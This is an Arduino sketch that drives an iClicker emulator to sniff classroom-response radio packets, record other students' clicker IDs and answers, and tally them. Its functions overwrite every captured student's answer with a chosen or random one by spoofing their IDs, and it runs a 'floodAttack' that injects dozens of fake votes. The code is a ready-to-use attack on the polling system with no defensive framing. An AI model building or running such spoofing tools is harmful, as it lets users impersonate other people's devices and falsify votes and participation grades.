
#include "iClickerEmulator.h"
#include <RingBufCPP.h>
#include <string.h>

#define IRQ_PIN 6
#define CSN 10
#define MAX_BUFFERED_PACKETS 50

#define THRESHOLD 1000
#define MAX_RECVD 500

#define RAND_LOW 35
#define RAND_HIGH 75
iClickerAnswerPacket_t recvd[MAX_RECVD];
uint32_t num_recvd = 0;


iClickerEmulator clicker(CSN, IRQ_PIN, digitalPinToInterrupt(IRQ_PIN));
RingBufCPP<iClickerPacket_t, MAX_BUFFERED_PACKETS> recvBuf;

void setup()
{
  Serial.begin(115200);
  //Serial.println("working");
  clicker.begin(iClickerChannels::AA);
  // enter promiscouse mode on sending channel
  clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
  delay(1000);
  Serial.println("Ready!\nr: Reset Capture\na-e: Submit\nf: Random id answers\nu: Uniform submit\np: Print");
}


void loop()
{
  char tmp[100];
  iClickerPacket_t r;

  static iClickerAnswerPacket_t old = {{0, 0,0, 0}, ANSWER_A};
  static uint32_t old_t = 0;

  //see if there is a pending packet, check if its an answer packet
  //see if different than pre packet
  while (recvBuf.pull(&r) && r.type == PACKET_ANSWER && (memcmp(&r.packet.answerPacket, &old, sizeof(old)) || millis() - old_t > THRESHOLD)) {
    uint8_t *id = r.packet.answerPacket.id;
    char answer = iClickerEmulator::answerChar((iClickerAnswer_t)r.packet.answerPacket.answer);
    old = r.packet.answerPacket;
    old_t = millis();
    updateRef(r.packet.answerPacket);
    snprintf(tmp, sizeof(tmp), "Captured [%lu]: %c (%02X, %02X, %02X, %02X)", num_recvd, answer, id[0], id[1], id[2], id[3]);
    Serial.println(tmp);
  }

  if (Serial.available())
  {
    char c = Serial.read();

    switch (c)
    {
      case 'r': case 'R':
        Serial.println("Emptying saved responses");
        num_recvd = 0;
        break;

      case 'a': case 'b': case 'c': case 'd': case 'e':
        clicker.stopPromiscuous();
        corrupt_ans(iClickerEmulator::charAnswer(c));
        clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
        break;

      case 'f':
        ans_randoms();
        clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
        break;

       case 'u':
         uniform_ans();
         clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
         break;

      case 'p':
        printCap();
        break;
    }
  }

  delay(100);

}


void recvPacketHandler(iClickerPacket_t *recvd)
{
  bool ret = recvBuf.add(*recvd);
}


void updateRef(iClickerAnswerPacket_t p)
{
  uint32_t i = 0;
  for (i = 0; i < num_recvd; i++)
  {
    if (!memcmp(recvd[i].id, p.id, ICLICKER_ID_LEN))
    {
      //update
      recvd[i] = p;
      break;
    }
  }

  //not found and space
  if (i == num_recvd && num_recvd < MAX_RECVD) {
    recvd[num_recvd++] = p;
  }

}


void corrupt_ans(iClickerAnswer_t a)
{
  char tmp[100];
  for (uint32_t i = 0; i < num_recvd; i++)
  {
    char answer = iClickerEmulator::answerChar(a);
    bool ret = clicker.submitAnswer(recvd[i].id, a); // no ack
    snprintf(tmp, sizeof(tmp), "%s %c for ID: (%02X, %02X, %02X, %02X)",
    ret ? "Successfully submitted" : "Failed to submit",answer, recvd[i].id[0], recvd[i].id[1], recvd[i].id[2], recvd[i].id[3]);
    Serial.println(tmp);
    delay(5);
  }
  
  snprintf(tmp, sizeof(tmp), "SUBMITTED A TOTAL OF %lu\n", num_recvd);
  Serial.println(tmp);
}


void uniform_ans()
{
  char tmp[100];
  for (uint32_t i = 0; i < num_recvd; i++)
  {
    iClickerAnswer_t answer = clicker.randomAnswer();
    bool ret = clicker.submitAnswer(recvd[i].id, answer); // no ack
    snprintf(tmp, sizeof(tmp), "%s %c for ID: (%02X, %02X, %02X, %02X)",
    ret ? "Successfully submitted" : "Failed to submit", iClickerEmulator::answerChar(answer), recvd[i].id[0], recvd[i].id[1], recvd[i].id[2], recvd[i].id[3]);
    Serial.println(tmp);
    delay(5);
  }

  snprintf(tmp, sizeof(tmp), "SUBMITTED A TOTAL OF %lu\n", num_recvd);
  Serial.println(tmp);
  
}


void ans_randoms()
{
  char tmp[100];
  int num = random(RAND_LOW, RAND_HIGH);
  snprintf(tmp, sizeof(tmp), "SUBMITTED %d RANDOM ANS\n", num);
  clicker.floodAttack(num, 1);
  Serial.println(tmp);
}

void printCap()
{
  Serial.println("********BEGIN DUMP********");
  char tmp[100];
  uint16_t res[NUM_ANSWER_CHOICES] = { 0 };
  for (uint32_t i = 0; i < num_recvd; i++)
  {
    res[recvd[i].answer]++;
    char answer = iClickerEmulator::answerChar((iClickerAnswer_t)recvd[i].answer);
    snprintf(tmp, sizeof(tmp), "Captured[%lu]: %c (%02X, %02X, %02X, %02X)", i, answer,
             recvd[i].id[0], recvd[i].id[1], recvd[i].id[2], recvd[i].id[3]);
    Serial.println(tmp);
  }

  snprintf(tmp, sizeof(tmp), "Results:\nA: %u\nB: %u\nC: %u\nD: %u\nE: %u\nP: %u\n",
           res[ANSWER_A], res[ANSWER_B], res[ANSWER_C], res[ANSWER_D], res[ANSWER_E], res[ANSWER_PING] );

  Serial.println(tmp);

  Serial.println("********END DUMP********");
}
